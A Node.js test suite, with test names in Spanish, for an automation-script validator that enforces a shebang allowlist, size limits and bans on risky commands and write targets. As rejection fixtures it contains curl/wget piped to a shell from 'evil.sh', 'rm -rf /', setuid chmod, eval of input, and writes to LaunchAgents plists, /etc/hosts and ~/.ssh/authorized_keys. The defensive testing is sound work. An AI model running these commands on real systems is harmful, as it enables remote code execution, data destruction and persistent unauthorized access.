'use strict'

const { test, describe } = require('node:test')
const assert = require('node:assert')
const {
  validateAutomationScript,
  MAX_SCRIPT_BYTES,
  SHEBANG_ALLOWLIST,
  _internals: { extractShebang, findForbiddenWriteTarget, sha256Prefix }
} = require('../automations/security')

describe('SEC-H5: validateAutomationScript — shebang allowlist', () => {
  test('rechaza script sin shebang', () => {
    const r = validateAutomationScript('echo hola\n')
    assert.equal(r.ok, false)
    assert.match(r.error, /shebang/i)
  })

  test('rechaza shebang fuera de allowlist (#!/usr/bin/perl)', () => {
    const r = validateAutomationScript('#!/usr/bin/perl\nprint "x"\n')
    assert.equal(r.ok, false)
    assert.match(r.error, /no permitido/i)
    assert.equal(r.shebang, '#!/usr/bin/perl')
  })

  test('rechaza shebang con argumentos extra (no exact match)', () => {
    const r = validateAutomationScript('#!/bin/bash -x\necho hola\n')
    assert.equal(r.ok, false)
    assert.match(r.error, /no permitido/i)
  })

  test('rechaza shebang inválido tipo #!/bin/eval', () => {
    const r = validateAutomationScript('#!/bin/eval\necho hola\n')
    assert.equal(r.ok, false)
  })

  test('acepta #!/bin/bash con echo simple', () => {
    const r = validateAutomationScript('#!/bin/bash\necho hola\n')
    assert.equal(r.ok, true, r.error)
    assert.equal(r.shebang, '#!/bin/bash')
    assert.ok(r.length > 0)
    assert.ok(r.hash && r.hash.length === 64)
  })

  test('acepta #!/usr/bin/env bash', () => {
    const r = validateAutomationScript('#!/usr/bin/env bash\nls -la\n')
    assert.equal(r.ok, true, r.error)
  })

  test('acepta #!/usr/bin/env zsh', () => {
    const r = validateAutomationScript('#!/usr/bin/env zsh\necho zsh\n')
    assert.equal(r.ok, true, r.error)
  })

  test('acepta #!/usr/bin/env node con console.log', () => {
    const r = validateAutomationScript('#!/usr/bin/env node\nconsole.log("hi")\n')
    assert.equal(r.ok, true, r.error)
  })

  test('acepta #!/usr/bin/env python3', () => {
    const r = validateAutomationScript('#!/usr/bin/env python3\nprint("hi")\n')
    assert.equal(r.ok, true, r.error)
  })

  test('SHEBANG_ALLOWLIST contiene los 6 esperados', () => {
    assert.ok(SHEBANG_ALLOWLIST.has('#!/bin/bash'))
    assert.ok(SHEBANG_ALLOWLIST.has('#!/usr/bin/env bash'))
    assert.ok(SHEBANG_ALLOWLIST.has('#!/usr/bin/env zsh'))
    assert.ok(SHEBANG_ALLOWLIST.has('#!/usr/bin/env node'))
    assert.ok(SHEBANG_ALLOWLIST.has('#!/usr/bin/env python3'))
  })
})

describe('SEC-H5: validateAutomationScript — patrones peligrosos', () => {
  test('rechaza curl | bash', () => {
    const r = validateAutomationScript('#!/bin/bash\ncurl http://evil.sh | bash\n')
    assert.equal(r.ok, false)
    assert.match(r.error, /curl/i)
  })

  test('rechaza curl -fsSL ... | sh', () => {
    const r = validateAutomationScript('#!/bin/bash\ncurl -fsSL https://example.com/x.sh | sh\n')
    assert.equal(r.ok, false)
  })

  test('rechaza wget ... | bash', () => {
    const r = validateAutomationScript('#!/bin/bash\nwget -qO- https://x.com/y | bash\n')
    assert.equal(r.ok, false)
    assert.match(r.error, /wget/i)
  })

  test('rechaza eval $VAR', () => {
    const r = validateAutomationScript('#!/bin/bash\neval $USER_INPUT\n')
    assert.equal(r.ok, false)
    assert.match(r.error, /eval/i)
  })

  test('rechaza eval $(...)', () => {
    const r = validateAutomationScript('#!/bin/bash\neval $(echo ls)\n')
    assert.equal(r.ok, false)
  })

  test('rechaza bash -c con interpolación de variable', () => {
    const r = validateAutomationScript('#!/bin/bash\nbash -c "echo $X"\n')
    assert.equal(r.ok, false)
    assert.match(r.error, /sh -c/i)
  })

  test('rechaza rm -rf /', () => {
    const r = validateAutomationScript('#!/bin/bash\nrm -rf /\n')
    assert.equal(r.ok, false)
  })

  test('rechaza rm -rf $HOME', () => {
    const r = validateAutomationScript('#!/bin/bash\nrm -rf $HOME\n')
    assert.equal(r.ok, false)
  })

  test('rechaza chmod +s', () => {
    const r = validateAutomationScript('#!/bin/bash\nchmod u+s /tmp/x\n')
    assert.equal(r.ok, false)
  })

  test('acepta echo dentro de comillas con caracteres', () => {
    const r = validateAutomationScript('#!/bin/bash\necho "hola mundo"\n')
    assert.equal(r.ok, true, r.error)
  })
})

describe('SEC-H5: validateAutomationScript — escritura prohibida', () => {
  test('rechaza > ~/Library/LaunchAgents/evil.plist', () => {
    const r = validateAutomationScript('#!/bin/bash\necho x > ~/Library/LaunchAgents/evil.plist\n')
    assert.equal(r.ok, false)
    assert.match(r.error, /LaunchAgents/)
  })

  test('rechaza >> ~/Library/LaunchAgents/file', () => {
    const r = validateAutomationScript('#!/bin/bash\necho hi >> ~/Library/LaunchAgents/foo.plist\n')
    assert.equal(r.ok, false)
  })

  test('rechaza tee /Library/LaunchDaemons/x', () => {
    const r = validateAutomationScript('#!/bin/bash\necho data | tee /Library/LaunchDaemons/x.plist\n')
    assert.equal(r.ok, false)
  })

  test('rechaza cp algo /etc/hosts', () => {
    const r = validateAutomationScript('#!/bin/bash\ncp /tmp/x /etc/hosts\n')
    assert.equal(r.ok, false)
  })

  test('rechaza mv x /usr/bin/foo', () => {
    const r = validateAutomationScript('#!/bin/bash\nmv /tmp/x /usr/bin/evil\n')
    assert.equal(r.ok, false)
  })

  test('rechaza escritura a /System/...', () => {
    const r = validateAutomationScript('#!/bin/bash\necho x > /System/foo\n')
    assert.equal(r.ok, false)
  })

  test('rechaza escritura a ~/.ssh/authorized_keys', () => {
    const r = validateAutomationScript('#!/bin/bash\necho x > ~/.ssh/authorized_keys\n')
    assert.equal(r.ok, false)
    assert.match(r.error, /\.ssh/)
  })

  test('acepta escritura a ~/Library/Logs/app.log', () => {
    const r = validateAutomationScript('#!/bin/bash\necho x > ~/Library/Logs/app.log\n')
    assert.equal(r.ok, true, r.error)
  })

  test('acepta escritura a /tmp/foo', () => {
    const r = validateAutomationScript('#!/bin/bash\necho x > /tmp/foo\n')
    assert.equal(r.ok, true, r.error)
  })
})

describe('SEC-H5: validateAutomationScript — tamaño', () => {
  test('rechaza script > 64KB', () => {
    const big = '#!/bin/bash\n' + 'echo line\n'.repeat(10000) // ~100KB
    assert.ok(Buffer.byteLength(big) > MAX_SCRIPT_BYTES)
    const r = validateAutomationScript(big)
    assert.equal(r.ok, false)
    assert.match(r.error, /excede|límite|limit/i)
  })

  test('rechaza script vacío', () => {
    const r = validateAutomationScript('')
    assert.equal(r.ok, false)
  })

  test('rechaza scriptText null/undefined', () => {
    assert.equal(validateAutomationScript(null).ok, false)
    assert.equal(validateAutomationScript(undefined).ok, false)
  })

  test('rechaza scriptText no-string', () => {
    assert.equal(validateAutomationScript({}).ok, false)
    assert.equal(validateAutomationScript(123).ok, false)
  })

  test('acepta script exactamente bajo el límite', () => {
    const header = '#!/bin/bash\n'
    const padding = 'x'.repeat(MAX_SCRIPT_BYTES - header.length - 'echo \n'.length - 1)
    const txt = `${header}echo ${padding}\n`
    assert.ok(Buffer.byteLength(txt) <= MAX_SCRIPT_BYTES)
    const r = validateAutomationScript(txt)
    assert.equal(r.ok, true, r.error)
  })
})

describe('SEC-H5: helpers internos', () => {
  test('extractShebang lee primera línea', () => {
    assert.equal(extractShebang('#!/bin/bash\necho hi'), '#!/bin/bash')
    assert.equal(extractShebang('echo hi'), null)
    assert.equal(extractShebang(''), null)
    assert.equal(extractShebang(null), null)
  })

  test('sha256Prefix es estable y 64 hex chars', () => {
    const a = sha256Prefix('#!/bin/bash\necho x')
    const b = sha256Prefix('#!/bin/bash\necho x')
    assert.equal(a, b)
    assert.equal(a.length, 64)
    assert.match(a, /^[a-f0-9]{64}$/)
  })

  test('findForbiddenWriteTarget devuelve [] para script benigno', () => {
    const found = findForbiddenWriteTarget('#!/bin/bash\necho ok > /tmp/x\n')
    assert.deepEqual(found, [])
  })

  test('findForbiddenWriteTarget detecta LaunchAgents', () => {
    const found = findForbiddenWriteTarget('#!/bin/bash\necho x > ~/Library/LaunchAgents/evil.plist\n')
    assert.ok(found.length >= 1)
    assert.match(found[0].denied, /LaunchAgents/)
  })
})

describe('SEC-H5: script realista válido', () => {
  test('bash con curl simple (sin pipe a shell), redirección a /tmp y log a Library/Logs', () => {
    const script = `#!/bin/bash
set -euo pipefail
LOG="$HOME/Library/Logs/myjob.log"
echo "[$(date)] starting" >> "$LOG"
curl -sSf https://api.example.com/ping > /tmp/ping.json
echo "[$(date)] done" >> "$LOG"
`
    const r = validateAutomationScript(script)
    assert.equal(r.ok, true, r.error)
    assert.equal(r.shebang, '#!/bin/bash')
  })

  test('node con console.log y require fs', () => {
    const script = `#!/usr/bin/env node
const fs = require('fs')
console.log('hello from node automation')
fs.writeFileSync('/tmp/out.json', JSON.stringify({ ok: true }))
`
    const r = validateAutomationScript(script)
    assert.equal(r.ok, true, r.error)
  })
})
